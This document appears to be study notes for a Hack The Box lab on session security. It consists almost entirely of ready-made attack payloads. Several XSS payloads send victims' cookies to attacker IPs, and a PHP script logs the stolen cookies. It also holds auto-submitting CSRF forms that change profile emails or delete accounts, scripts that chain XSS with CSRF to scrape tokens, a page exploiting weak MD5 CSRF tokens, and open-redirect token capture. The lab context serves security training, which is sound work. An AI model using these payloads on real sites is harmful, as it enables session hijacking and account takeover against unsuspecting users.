# Session Security 

```bash

10.129.22.166	xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net
nhu0huvhpcv69gt6i897v9spnb
```


# Obtaining Session Identifiers without User Interaction



# Cross-Site Scripting (XSS)

```js

"><img src=x onerror=prompt(document.domain)>

"><img src=x onerror=confirm(1)>

"><img src=x onerror=alert(1)>

// https

<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>

<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>

<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>

<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>

<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>


<table%20background='%2f%2f10.10.16.30:8000%2f
```

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

```bash

 php -S <VPN/TUN Adapter IP>:8000

 nc -nlvp 8000

```


# Cross-Site Request Forgery (CSRF or XSRF)


```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>


```


```bash

python -m http.server 1337

# visit the page and the user info will change

http://10.10.16.30:1337/notmalicious.html

```

# Cross-Site Request Forgery (GET-based)

```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>


```

```bash
 python -m http.server 1337

http://10.10.16.30:1337/notmalicious_get.html

```

# Cross-Site Request Forgery (POST-based)


```html

<h1>h1<u>underline<%2fu><%2fh1>

# set in the url
<table%20background='%2f%2f10.10.16.30:8000%2f


```


```bash

nc -nlvp 8000

```

# XSS & CSRF Chaining

https://academy.hackthebox.com/module/153/section/1450

```js 

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>



```

```js

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/delete/mhmdth.rdyy@example.com',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/delete', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token);
};
</script>



```

# Exploiting Weak CSRF Tokens

https://academy.hackthebox.com/module/153/section/1451

```html

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="never">
    <title>Proof-of-concept</title>
    <link rel="stylesheet" href="styles.css">
    <script src="./md5.min.js"></script>
</head>

<body>
    <h1> Click Start to win!</h1>
    <button class="button" onclick="trigger()">Start!</button>

    <script>
        let host = 'http://csrf.htb.net'

        function trigger(){
            // Creating/Refreshing the token in server side.
            window.open(`${host}/app/change-visibility`)
            window.setTimeout(startPoc, 2000)
        }

        function startPoc() {
            // Setting the username
            let hash = md5("crazygorilla983")

            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
        }
    </script>
</body>
</html>


```
For your malicious page to have MD5-hashing functionality, save the below as md5.min.js and place it in the directory where the malicious page resides.

```bash

python -m http.server 1337

http://10.10.16.30:1337/press_start_2_win.html

```



# Open Redirect

```
http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>

```




```bash

<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.16.3:8000/log.php?c=' + document.cookie;"></video>

http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com


<h1 onmouseover='document.write(`<img src="http://10.10.14.49:9000?cookie=${btoa(document.cookie)}">`)'>test</h1>


```